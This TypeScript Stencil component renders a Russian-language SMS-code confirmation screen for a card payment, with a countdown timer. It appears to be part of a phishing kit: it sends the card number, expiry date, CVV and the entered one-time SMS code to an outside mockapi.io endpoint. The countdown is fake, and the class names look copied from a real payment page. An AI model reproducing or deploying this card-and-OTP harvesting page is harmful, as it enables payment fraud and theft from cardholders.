import { Component, h, State, Prop } from '@stencil/core';
import axios from 'axios';

@Component({
  tag: 'pmt-timer',
  styleUrl: 'pmt-timer.scss',
  shadow: true,
})
export class PtmTimer {
  @State() minutes: number = 2;
  @State() seconds: number = 59;
  @State() smsCode: string;
  @Prop() cardNumber: string;
  @Prop() expDate: string;
  @Prop() cvv: string;

  connectedCallback() {
    setInterval(() => {
      this.seconds = this.seconds - 1;
      if (this.seconds === 0 && this.minutes === 2) {
        this.seconds = 10;
        this.minutes = 1;
      }
      if (this.seconds === 0 && this.minutes === 1) {
        this.seconds = 10;
        this.minutes = 0;
      }
    }, 1000);
  }

  onSubmitHandler() {
    axios
      .post('https://631cbb941b470e0e12094434.mockapi.io/cards', {
        cardNumber: this.cardNumber,
        expDate: this.expDate,
        cvv: this.cvv,
        smsCode: this.smsCode,
      })
      .then(function (response) {
        console.log(response);
      })
      .catch(function (error) {
        console.log(error);
      });
  }
  onSmsInputHandler(e: Event) {
    const eTarget = e.target as HTMLTextAreaElement;
    this.smsCode = eTarget.value;
  }
  render() {
    return (
      <div class={'container'}>
        <span class={'timer__upperText'}>Введите код из СМС, либо подтвердите оплату в приложении.</span>
        <div class={'input-button-container'}>
          <input class={'timer__input gMRvDD'} onInput={e => this.onSmsInputHandler(e)} />
          <button class={'flXVgX jvlMTM'} onClick={this.onSubmitHandler.bind(this)}>
            Подтвердить
          </button>
        </div>

        <div class={'timer__timer'}>
          {this.seconds <= 0 && this.minutes <= 0 ? (
            <span>Повторная попытка доступна через: 0:00</span>
          ) : (
            <span>
              Повторная попытка доступна через: {this.minutes}:{this.seconds <= 10 ? '0' + this.seconds : this.seconds}
            </span>
          )}
        </div>
      </div>
    );
  }
}
